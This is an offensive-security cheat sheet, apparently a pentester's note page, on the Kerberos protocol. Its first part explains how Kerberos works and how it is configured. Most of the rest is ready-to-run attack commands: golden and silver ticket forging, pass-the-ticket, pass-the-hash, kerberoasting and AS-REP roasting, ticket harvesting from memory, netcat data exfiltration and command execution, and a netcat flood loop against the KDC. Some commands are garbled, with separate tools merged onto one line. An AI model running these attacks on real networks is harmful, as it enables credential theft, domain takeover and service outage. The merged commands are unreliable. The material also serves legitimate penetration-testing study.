# Index
- [[Ports, Protocols, and Services]]

# Kerberos

- **Port Number:** 88 (TCP/UDP)
- **Protocol:** TCP/UDP
- **Service Name:** Kerberos
- **Defined in:** RFC 4120

Kerberos is a network authentication protocol designed to provide secure authentication for client-server applications by using secret-key cryptography. It is a critical component of many modern enterprise environments, especially within Windows domains, where it is the default authentication method used by Active Directory (AD).

## Overview of Features

- **Mutual Authentication:** Kerberos provides mutual authentication, ensuring that both the user and the server confirm each other's identity before a secure connection is established.
  
- **Single Sign-On (SSO):** Kerberos enables single sign-on, allowing users to authenticate once and gain access to multiple services without needing to re-authenticate.

- **Ticket Granting:** The protocol uses "tickets" as tokens of authentication. These tickets are time-stamped and encrypted, reducing the need to transmit passwords over the network.

- **Symmetric Key Cryptography:** Kerberos relies on symmetric key cryptography for secure communications between the client and server, minimizing the risk of data interception.

- **Scalability:** Designed to operate in large, distributed networks, Kerberos can efficiently handle the authentication needs of thousands of users and services.

## Typical Use Cases

- **Enterprise Authentication:** Kerberos is widely used in corporate environments to authenticate users across various services, such as accessing file shares, email servers, and databases.
  
- **Windows Active Directory:** Kerberos is the default authentication protocol for Windows domains, underpinning the security model of Active Directory.

- **Secure Communication:** By authenticating both clients and servers, Kerberos helps secure sensitive communications within an organization, preventing unauthorized access.

- **Cross-Platform Integration:** Kerberos can be integrated into non-Windows environments, such as Unix/Linux systems, providing a unified authentication mechanism across different platforms.

## How Kerberos Protocol Works

1. **Initial Authentication Request:**
   - **Step 1:** The user logs in by entering their username and password. The client application (usually part of the operating system) sends a request to the Authentication Server (AS) within the Key Distribution Center (KDC).
   
   - **Step 2:** The request includes the user’s identity but not their password. Instead, the client generates a symmetric key derived from the user's password and uses it to encrypt the request.

2. **Ticket Granting Ticket (TGT) Issuance:**
   - **Step 3:** The AS verifies the user's identity by decrypting the request using its copy of the symmetric key. If successful, the AS generates a Ticket Granting Ticket (TGT) and a session key.
   
   - **Step 4:** The TGT, encrypted with the KDC's secret key, is sent back to the client along with the session key, which is encrypted with the user’s symmetric key.

3. **Service Request:**
   - **Step 5:** When the user tries to access a specific service (e.g., a file server), the client sends the TGT and an authenticator (a timestamp encrypted with the session key) to the Ticket Granting Server (TGS) within the KDC.
   
   - **Step 6:** The TGS decrypts the TGT using its secret key and verifies the authenticator. If valid, the TGS generates a Service Ticket (ST) and a new session key for the service, sending them back to the client.

4. **Service Authentication:**
   - **Step 7:** The client presents the Service Ticket and a new authenticator to the target service.
   
   - **Step 8:** The service decrypts the Service Ticket with its own secret key and verifies the authenticator using the session key. If valid, the service grants access to the client.

5. **Mutual Authentication:**
   - **Step 9:** The service can optionally authenticate back to the client by encrypting a timestamp with the session key and sending it to the client, confirming that the service is legitimate.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` sends authentication request to `<target_ip>` (KDC).
- **KDC:** `<target_ip>` issues TGT, and subsequent service ticket as user accesses services.

# Additional Information

## Key Distribution Center (KDC)

**Authentication Service (AS):** Verifies the user's identity and issues the TGT.
**Ticket Granting Service (TGS):** Issues service tickets based on the TGT.
**Database:** Stores the secret keys of all users and services.

## Ticket Granting System
- **TGT (Ticket Granting Ticket):** The TGT is a token issued by the KDC that allows a user to request access to other services without re-entering their password. The TGT has a limited lifespan, typically 8 to 10 hours, after which the user must re-authenticate.
  
- **Service Ticket:** A Service Ticket is used to authenticate to specific services. Unlike the TGT, it is encrypted with the service’s secret key and is valid only for the intended service.

## Kerberos Tickets

|**Ticket Type**|**Description**|
|-|-|
| Ticket Granting Ticket (TGT)           | Issued by the AS, used to request service tickets from the TGS.              |
| Service Ticket                         | Issued by the TGS, used by the client to authenticate to a specific service. |
| Authentication Service (AS) Response   | The initial response from the AS containing the TGT.                         |
| Ticket Granting Service (TGS) Response | The response from the TGS containing the service ticket.                     |


## Encryption Algorithms
- **Default Encryption:** Kerberos typically uses AES (Advanced Encryption Standard) in modern implementations, but older versions may use DES (Data Encryption Standard), which is considered insecure by today's standards.
  
- **Session Keys:** Generated for each session, these keys are unique and ensure that each session between a client and a service is encrypted independently.

## Time Synchronization

- Kerberos heavily relies on time synchronization between the client, KDC, and service to prevent replay attacks. Time discrepancies can cause authentication failures.
- Kerberos uses timestamps to prevent replay attacks. The validity of tickets is time-bound, and the clocks of all parties involved must be synchronized.

## Security Considerations
- **Replay Attacks:** To prevent replay attacks, Kerberos uses time-stamped tickets and authenticators that include a timestamp. Tickets are only valid for a short period, making replay attacks difficult.

- **KDC as a Single Point of Failure:** The KDC is central to the operation of Kerberos. If the KDC is compromised, the security of the entire network could be at risk.

- **Credential Theft:** If an attacker can steal a user's TGT or Service Ticket, they may be able to impersonate the user without knowing the password.

## Advanced Usage
- **Kerberos Delegation:** Allows a service to request tickets on behalf of a user, enabling complex service chains where multiple services need to authenticate each other on behalf of the user.
  
- **Cross-Realm Authentication:** Kerberos supports cross-realm authentication, allowing users in one domain to authenticate to services in another domain without requiring separate credentials.

## Configuration Files

1. **krb5.conf:**
  - **Location:** `/etc/krb5.conf` (Linux), `C:\Windows\krb5.ini` (Windows)
  - **Configuration Example:**
	```c
	[libdefaults]
	    default_realm = EXAMPLE.COM
	    dns_lookup_realm = false
	    dns_lookup_kdc = true
	    ticket_lifetime = 24h
	    renew_lifetime = 7d
	    forwardable = true
	
	[realms]
	    EXAMPLE.COM = {
	        kdc = kdc.example.com
	        admin_server = kdc.example.com
	    }
	
	[domain_realm]
	    .example.com = EXAMPLE.COM
	    example.com = EXAMPLE.COM
	```
  - **Key Settings:**
    - `default_realm`: Specifies the default Kerberos realm for the client.
    - `ticket_lifetime`: Sets the default lifetime of tickets.
    - `kdc`: Specifies the KDC server(s) for a given realm.
    - `forwardable`: Indicates whether the TGT is forwardable to other services.

2. **kdc.conf:**
  - **Location:** `/etc/krb5kdc/kdc.conf` (Linux)
  - **Configuration Example:**
	```c
	[kdcdefaults]
	    kdc_ports = 88
	
	[realms]
	    EXAMPLE.COM = {
	        database_name = /var/krb5kdc/principal
	        admin_keytab = /var/krb5kdc/kadm5.keytab
	        max_life = 10h 0m 0s
	        max_renewable_life = 7d 0h 0m 0s
	        master_key_type = aes256-cts-hmac-sha1-96
	    }
	```
  - **Key Settings:**
    - `kdc_ports`: Defines the port(s) used by the KDC.
    - `max_life`: Specifies the maximum lifetime for tickets issued by the KDC.
    - `master_key_type`: Defines the encryption type used for the master key.

## Potential Misconfigurations

- **Weak Encryption Algorithms:**
  - **Risk:** Using outdated encryption algorithms like DES can make the Kerberos protocol vulnerable to brute-force attacks.
  - **Exploitation:** An attacker can break the encryption and impersonate users or decrypt sensitive data.

- **Improper Ticket Lifetime Settings:**
  - **Risk:** Setting ticket lifetimes too long increases the window of opportunity for an attacker to exploit a compromised ticket.
  - **Exploitation:** If a TGT or Service Ticket is stolen, the attacker can use it for an extended period, increasing the potential damage.

- **KDC Availability:**
  - **Risk:** Failure to properly replicate KDCs across different sites can lead to authentication failures in case of a network partition or KDC failure.
  - **Exploitation:** In a worst-case scenario, the entire network’s authentication infrastructure could become unusable.

- **Unnecessary Kerberos Delegation:**
  - **Risk:** Overuse of delegation can lead to security risks, particularly if the services that can delegate on behalf of users are not properly secured.
  - **Exploitation:** An attacker compromising a delegated service could misuse the delegated privileges to access resources they shouldn’t have access to.

## Default Credentials

Kerberos itself does not have default credentials in the typical sense, as it relies on user-provided credentials (username and password) and tickets. However, default configurations of related services (such as those in Active Directory) might include default usernames or passwords for administrative accounts.

# Interaction and Tools

## Tools

### [[KInit]]
- **Obtain and Cache TGT:** Obtains and caches a Ticket Granting Ticket (TGT) for the specified user.
	```bash
	kinit <username>
	```
- **Kerberos Ticket Renewal:** Renews an existing TGT, extending its validity without requiring the user to re-enter their password.
	```bash
	kinit -R
	```

### [[KList]]
- **List Current Tickets:** Lists the current tickets in the user’s ticket cache.
	```bash
	klist
	```
- **Exporting Tickets:** Exports the list of tickets to a text file, useful for auditing and analysis.
	```bash
	klist -e > tickets.txt
	```

### [[KDestroy]]
- **Destroy Ticket Cache:** Destroys the current user's ticket cache, removing all cached Kerberos tickets.
	```bash
	kdestroy
	```
- **Service Ticket Request:** Requests a Service Ticket for the specified service, useful for testing service authentication manually.
	```bash
	kvno <service>
	```

### [[KerbTray]]
- **Description:** A graphical tool for Windows that allows users to view and manage their Kerberos tickets Useful for viewing and renewing tickets in a Windows environment.

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 88"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 88
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 88
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 88 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 88
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 88 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple test to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:88
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 88 -c 1
    ```

### [[Rubeus]]
- **Description:** A C# tool used to interact with the Kerberos protocol, capable of performing various Kerberos attacks, including ticket harvesting, pass-the-ticket, and more.
    ```bash
    rubeus.exe tgtdeleg
    ```
- **Use Case:** Harvesting TGTs and performing Kerberos delegation attacks.

### [[Mimikatz Cheat Sheet]]
- **Description:** A post-exploitation tool that can extract Kerberos tickets (TGTs) from memory, enabling pass-the-ticket attacks.
    ```bash
    sekurlsa::tickets /export
    ```
- **Use Case:** Extracting and exporting Kerberos tickets for further analysis or lateral movement.

### [[Impacket]]

#### [[Impacket-getTGT]]
- **Obtain a TGT via username/password:** Obtaining a TGT for a specified user, which can then be used for further attacks.
	 ```bash
	impacket-getTGT <domain>/<username>:<password>
	```

#### [[Impacket-getST]]
- **Obtain a Service Ticket via TGT:**
	```bash
	impacket-getST <domain>/<username>:<password> -spn <service>/<hostname>
	```

#### [[zImpacket-getNPUsers]]
- **Harvest TGTs for users without pre-authentication:**
	```bash
	impacket-getnpusers -dc-ip <target_ip> -no-pass <domain>/<username>
	```

#### [[Impacket-getUsersSPNs]]
- **Extract Service Tickets:** Obtain Service Tickets for offline cracking.
	```bash
	impacket-getuserspns <domain>/<username>:<password> -dc-ip <target_ip> -request
	```

### [[CrackMapExec]]
- **Connect via username/password:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p <password> --kerberos
	```
- **Use Case:** Exploit Kerberos services for access and post-exploitation activities.

	CME supports Kerberos authentication. There are two options, directly using a password/hash or using a ticket and using the KRB5CCNAME env name to specify the ticket.
	When using the option `-k` or `--use-kcache`, you need to specify the same hostname (FQDN) as the one from the kerberos ticket.

	```bash
	sudo cme smb zoro.gold.local -k -u bonclay -p Ocotober2022
	SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
	SMB         zoro.gold.local 445    ZORO             [+] gold.local\bonclay
	
	Or, using --use-kcache
	
	$ export KRB5CCNAME=/home/bonclay/impacket/administrator.ccache
	$ cme smb zoro.gold.local --use-kcache
	SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
	SMB         zoro.gold.local 445    ZORO             [+] gold.local\administrator (Pwn3d!)
	
	sudo cme smb zoro.gold.local --use-kcache -x whoami
	
	SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
	SMB         zoro.gold.local 445    ZORO             [+] gold.local\administrator (Pwn3d!)
	SMB         zoro.gold.local 445    ZORO             [+] Executed command
	SMB         zoro.gold.local 445    ZORO             gold\administrator
	
	$ export KRB5CCNAME=/home/bonclay/impacket/bonclay.ccache
	$ sudo cme smb zoro.gold.local --use-kcache -x whoami
	SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
	SMB         zoro.gold.local 445    ZORO             [+] gold.local\bonclay
	```

- **Kerberos Enumeration:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p <password> --kerberos
	```

- **Pass-the-Hash:**
	```bash
	crackmapexec smb <target_ip> -u <username> -H <NTLM hash> --kerberos
	```

## Other Techniques

### Harvesting Tickets From Windows
In Windows, tickets are handled and stored by the lsass (Local Security Authority Subsystem Service) process, which is responsible for security. Hence, to retrieve tickets from a Windows system, it is necessary to communicate with lsass and ask for them. As a non-administrative user only owned tickets can be fetched, however, as machine administrator, all of them can be harvested. 

### Harvesting Tickets From Linux
On Linux, tickets are stored in credential caches or ccaches. There are 3 main types, which indicate where tickets can be found:

- Files, by default under `/tmp directory`, in the form of `krb5cc_%{uid}`.
- Kernel Keyrings, an special space in the Linux kernel provided for storing keys.
- Process memory, used when only one process needs to use the tickets.

To verify what type of storage is used in a specific machine, the variable `default_ccache_name` must be checked in the `/etc/krb5.conf` file, which by default has read permission to any user. In case of this parameter being missing, its default value is `FILE:/tmp/krb5cc_%{uid}`.

In order to extract tickets from the other 2 sources (keyrings and processes), a great paper, Kerberos Credential Thievery (GNU/Linux), released in 2017, explains ways of recovering the tickets from them.

Keyring - From the paper

The Linux kernel has a feature called keyrings. This is an area of memory residing within the kernel that is used to manage and retain keys.

The keyctl system call was introduced in kernel version 2.6.10 5 . This provides user space applications an API which can be used to interact with kernel keyrings.

The name of the keyring in use can be parsed from the Kerberos configuration file `/etc/krb5.conf` which has read permission enable for anybody (octal 644) by default. An attacker can then leverage this information to search for ticket 11 containing keyrings and extract the tickets. A proof of concept script that implements this functionality can be seen in Section A.2 (hercules.sh). In a keyring the ccache is stored as components. As seen in Figure 2, a file ccache is made up of 3 distinct components: header, default principal, and a sequence of credentials. A keyring holds the default principal and credentials. This script will dump these components to separate files. Then using an attacker synthesised header these pieces are combined in the correct order to rebuild a file ccache. This rebuilt file can then be exfiltrated to an attacker machine and then used to impersonate a Kerberos user. A simple program for generating a valid ccache header can be seen in Section A.3.

Based on the heracles.sh script (from the paper) a C tool you can use (created by the author of the complete post) is tickey, and it extracts tickets from keyrings:

```c
tmp/tickey -i
```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 88
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 88
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

### SPN (Service Principal Name) Enumeration
- **Tool:** [[setspn]] (Windows)
    ```bash
    setspn -L <target_user>
    ```
- **Description:** Lists all Service Principal Names (SPNs) associated with a user, useful for identifying services that might be vulnerable to Kerberoasting.

## Initial Access

### Overpass-the-Hash (Pass-the-Key)
- **Tool:** [[Mimikatz Cheat Sheet]]
    ```bash
    sekurlsa::pth /user:<username> /domain:<domain> /rc4:<NTLM_hash>
    ```
- **Description:** Uses the NTLM hash of a user’s password to generate a Kerberos ticket, elevating privileges within the domain.

<br>

- **Tool:** [[Rubeus]]
	```bash
	rubeus.exe asktgt /user:user /rc4:hash
	```

### Pass-the-Ticket
- **Tool:** [[Mimikatz Cheat Sheet]], [[Rubeus]]
    ```bash
    kerberos::ptt <ticket.kirbi>
    ```
- **Description:** Reuses stolen Kerberos tickets to authenticate as the original user, bypassing the need for a password.

<br>

- **Tool:** [[Rubeus]]
	```bash
	rubeus.exe ptt /ticket:<base64ticket>
	```

### Golden Ticket Attack
- **Tool:** [[Mimikatz Cheat Sheet]]
    ```bash
    kerberos::golden /domain:<domain> /sid:<domain_SID> /target:<target_FQDN> /rc4:<NTLM_hash> /user:<username>
    ```
- **Description:** Creates a forged TGT that can be used to impersonate any user in the domain, providing persistent access.

### Silver Ticket Attack
- **Tool:** [[Mimikatz Cheat Sheet]]
    ```bash
    kerberos::golden /domain:<domain> /sid:<domain_SID> /target:<service_FQDN> /rc4:<NTLM_hash> /user:<username> /service:<service_name>
    ```
- **Description:** Creates a forged Service Ticket (TGS) that can be used to access specific services, offering a more targeted form of persistence.

## Credential Harvesting

### Kerberoasting
- **Tool:** [[CrackMapExec]]
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --kerberoasting output.txt
	```
  
<br>

- **Tool:** [[Rubeus]]
    ```bash
    rubeus.exe kerberoast
    ```

<br>

- **Tool:** [[zImpacket-getNPUsers]]
	```bash
	impacket-getNPUsers -request -dc-ip <target_ip> <domain>/<username>:<password> hashcat -m 13100 <ticket.hash> /path/to/wordlist
	```
- **Description:** Requests Service Tickets for SPNs and attempts to crack their encryption offline, potentially revealing passwords of service accounts.

### AS-REP Roasting
- **Tool:** [[CrackMapExec]]
- **Without authentication:**
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '' --asreproast output.txt
	```
- **With authentication:**
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --asreproast output.txt
	```
- **Use option `--kdcHost` when the domain name resolution fail:**
	```bash
	crackmapexec ldap <target_ip> -u <username> -p '<password>' --asreproast output.txt --kdcHost domain_name
	```

<br>

- **Tool:** [[Rubeus]], [[Impacket]]
    ```bash
    rubeus.exe asreproast
    ```

<br>

- **Tool:** [[zImpacket-getNPUsers]]
	```bash
	impacket-GetNPUsers -no-preauth <domain>/<username> -request -dc-ip <target_ip> hashcat -m 18200 <asrep.hash> /path/to/wordlist
	```
- **Description:** Exploits users that have "Do not require Kerberos preauthentication" set by retrieving AS-REP messages and attempting to crack them offline.

## Privilege Escalation

### Kerberos Delegation Abuse
- **Tool:** [[Rubeus]]
    ```bash
    rubeus.exe tgtdeleg
    ```
- **Description:** Exploits Kerberos delegation to impersonate users and access resources on their behalf.

## Internal Reconnaissance

### Enumeration of Kerberos Tickets
- **Tool:** [[Mimikatz Cheat Sheet]]
    ```bash
    sekurlsa::tickets
    ```
- **Description:** Lists all Kerberos tickets in memory, helping identify high-value targets for further exploitation.

## Lateral Movement, Pivoting, and Tunnelling

### Pass-the-Ticket for Lateral Movement
- **Tool:** [[Mimikatz Cheat Sheet]]
    ```bash
    sekurlsa::ptt <ticket.kirbi>
    ```
- **Description:** Move laterally within the network by using stolen Kerberos tickets to access services on other systems.

## Defense Evasion

### Ticket Renewal to Avoid Detection
- **Tool:** [[KInit]]
    ```bash
    kinit -R
    ```
- **Description:** Renews the TGT to maintain persistence while avoiding detection from expired tickets.

### TGT Manipulation
- **Tool:** [[Mimikatz Cheat Sheet]]
    ```bash
    kerberos::golden /domain:<domain> /sid:<domain_SID> /target:<target_FQDN> /rc4:<NTLM_hash> /user:<username> /renew
    ```
- **Description:** Generates a new TGT that extends the attacker’s ability to remain undetected while maintaining access.

## Data Exfiltration

### Stealthy Data Exfiltration via Kerberos
- **Tool:** [[Rubeus]], [[Custom Scripts]]
    ```bash
    rubeus.exe tgtdeleg /extract
    ```
- **Description:** Use delegated tickets to access sensitive data on behalf of a user, exfiltrating it under the guise of legitimate access.

# Exploits and Attacks

## Denial of Service

### KDC Overload Attack
- **Tool:** [[Custom Scripts]], [[NetCat]]
    ```bash
    while true; do echo "flood" | nc <target_ip> 88; done
    ```
- **Description:** Overwhelm the KDC with authentication requests, potentially causing legitimate authentication attempts to fail.

# Resources

|**Website**|**URL**|
|-|-|
|Kerberos Documentation|https://web.mit.edu/kerberos/|
|Microsoft Docs on Kerberos|[https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)|
|Impacket Tools|[https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)|
|Mimikatz|[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)|
|Kerberos Protocol Tutorial|https://www.kerberos.org/software/tutorial.html|
|NIST SP 800-63|[https://pages.nist.gov/800-63-3/sp800-63b.html](https://pages.nist.gov/800-63-3/sp800-63b.html)|
|RFC 4120|https://tools.ietf.org/html/rfc4120|
|Kerberos (Wikipedia)|[https://en.wikipedia.org/wiki/Kerberos_(protocol)](https://en.wikipedia.org/wiki/Kerberos_(protocol))|
|MIT Kerberos Documentation|https://web.mit.edu/kerberos/krb5-1.12/doc/|
|Microsoft Kerberos (TechNet)|[https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)|
|Red Teaming with Rubeus|[https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)|
|Understanding Kerberos in Active Directory|[https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/kerberos-protocol-transitions-and-constrained-delegation](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/kerberos-protocol-transitions-and-constrained-delegation)|
|Kerberoasting Explained|https://adsecurity.org/?p=2293|
|Overpass-the-Hash Technique|https://attack.mitre.org/techniques/T1550/004/|
|AS-REP Roasting Guide|https://www.specterops.io/assets/resources/AS-REP_Roasting.pdf|
|Kerberos in UNIX/Linux|https://web.mit.edu/kerberos/krb5-1.12/doc/admin/|